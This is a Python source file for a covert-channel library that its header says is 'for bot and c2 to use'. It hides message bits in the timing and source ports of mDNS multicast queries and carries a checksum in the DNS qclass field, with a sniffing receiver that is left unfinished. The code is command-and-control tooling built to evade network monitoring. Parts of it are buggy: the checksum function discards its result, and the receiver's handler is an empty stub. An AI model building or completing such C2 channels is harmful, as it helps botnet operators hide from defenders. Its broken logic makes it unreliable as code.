#!/usr/bin/python3
# Covert Channel Communication Library for bot and c2 to use
import logging
import threading
import bitarray
from scapy import packet
from scapy.arch import get_if_addr
from scapy.config import conf
from scapy.layers.dns import DNS
from scapy.layers.inet import IP, UDP
from scapy.packet import Packet
from scapy.sendrecv import send, sniff
import time

logging.basicConfig(level=logging.DEBUG)


def mkpkt(srcprt: int, qclass: int) -> packet.Packet:
    # TODO: make sure setting broadcast IP is enough or if we need to set broadcast MAC too
    myip = get_if_addr(conf.iface)
    # Construct query from raw bytes
    query = DNS(b'\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\t_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0c'
                b'\x00\x01')
    # set qclass to checksum fragment value
    query.qd.qclass = qclass
    # construct new packet and send it to broadcast addr
    return IP(src=myip, dst="224.0.0.251") / UDP(sport=srcprt, dport="mdns") / query


def calcsum(bits: bitarray):
    """Incredibly stupid checksum function but it should work"""
    output = bitarray.bitarray()
    counter = 0
    for i in bits:
        if counter == 0:
            output.append(i)
        elif counter == 15:
            counter = 0
        else:
            counter += 1
    while len(bits) > 16:
        bits.pop()
    while len(bits) < 16:
        bits.append(1)
    return bits


class Message:
    def __init__(self, string: str):
        self.bitlist = bitarray.bitarray()
        self.bitlist.frombytes(bytes(string, "utf8"))
        self.checksum = calcsum(self.bitlist)
        self.base_port = 5350

    def preamble(self):
        # Transmit 0xAA 0xFF 0xAA 0xFF
        while round(time.time(), 2) - round(time.time()) != 0.0:
            # wait until next second to start transmission
            time.sleep(0.005)
        for i in range(0, 4):
            mask = i % 2
            for b in range(0, 8):
                if b % 2 != mask:
                    continue
                qclass = 0
                # Grab checksum segment and convert to qclass symbol
                match self.checksum[2 * b:2 * b + 2].tolist():
                    case [0, 0]:
                        qclass = 1
                    case [1, 0]:
                        qclass = 2
                    case [0, 1]:
                        qclass = 3
                    case [1, 1]:
                        qclass = 4
                # build packet and send it
                p = mkpkt(self.base_port + b, qclass)
                send(p)

    def postabmle(self):
        # Transmit 0xFF 0xAA 0xFF 0xAA
        for i in range(0, 4):
            mask = i % 2
            time.sleep(0.25)
            for b in range(0, 8):
                if b % 2 == mask:
                    continue
                p = mkpkt(self.base_port + b, 255)
                send(p)

    def send(self):
        self.preamble()
        while len(self.bitlist) != 0:
            # Wait 1/4 second for next frame (synchronized by preamble)
            time.sleep(0.25)
            for i in range(0, 8):
                try:
                    payload = self.bitlist.pop(0)
                except IndexError:  # shouldn't ever happen since we converted from bytes
                    break
                # Don't transmit packet if payload is 0
                if payload == 0:
                    continue
                p = mkpkt(self.base_port + i, 1)
                send(p)
            logging.debug("Successfully send frame")
        self.postabmle()
        logging.info("Done transmitting!")


class Frame:
    def __init__(self, pkt: Packet):
        self.payload = bitarray.bitarray([0, 0, 0, 0, 0, 0, 0, 0])
        self.codes = [0, 0, 0, 0, 0, 0, 0, 0]
        self.when = time.time()
        self.flag = 0
        # Flags: 0- Data 1- Pre-amble 2- Post-amble 3- invalid
        self.base_port = 5350
        self.finalized = False
        self.parse(pkt)

    def parse(self, pkt: Packet):
        position = pkt["UDP"].sport - self.base_port
        self.payload[position] = 1
        self.codes[position] = pkt["DNS"].qd.qclass

    def finalize(self):
        datapacket = True
        for i in self.codes:
            if i != 255 and i != 0:
                datapacket = False
                # Pre-/Post-ambles will have non-255 codes as they indicate checksums
        if datapacket:
            self.flag = 0
        else:
            # Either a pre- or post-amble
            if self.payload.tobytes() == b'\xaa' or self.payload.tobytes() == b'\x55':
                self.flag = 1
            elif self.payload.all() == 1 and self.codes.count(1) == 8:
                self.flag = 2
            else:
                self.flag = 3
                logging.warning("Got bad frame!")


class Stream:
    def __init__(self, pkt: Packet):
        self.frames: list[Frame]
        self.frames = [Frame(pkt)]
        self.addr = pkt["IP"].src
        self.payload = ""
        self.checksum = bitarray.bitarray()
        self.checksum.frombytes(b'\x00\x00')

    def handle_packet(self, pkt: Packet):
        newframe = True
        for i in self.frames:
            if abs(time.time() - i.when) <= 0.25:
                newframe = False
                # if frame is still the active frame
                i.parse(pkt)
            elif not i.finalized:
                # if frame is inactive but unprocessed
                i.finalize()
                if i.flag == 1:
                    index = -1
                    for c in i.codes:
                        index += 1
                        val1 = 0
                        val2 = 0
                        # decode symbols to binary
                        match c:
                            case 1:
                                pass
                                # values are already set properly
                            case 2:
                                val1 = 1
                            case 3:
                                val2 = 1
                            case 4:
                                val1 = 1
                                val2 = 1
                            case _:
                                logging.error("Invalid qclass for checksum!")
                                break
                        self.checksum[2 * index] = val1
                        self.checksum[2 * index + 1] = val2

                elif i.flag == 3:
                    self.frames.remove(i)
        if newframe:
            self.frames.append(Frame(pkt))


class Receiver:
    def __init__(self):
        self.messages = []
        self.tlock = threading.Lock()
        self.streams = []

    def packethandler(self, pkt: Packet):
        pass

    def start(self):
        """Initiate packet sniffing, should be launched in its own thread"""
        sniff(prn=self.packethandler())
        logging.warning("Communication Sniffer exited!")
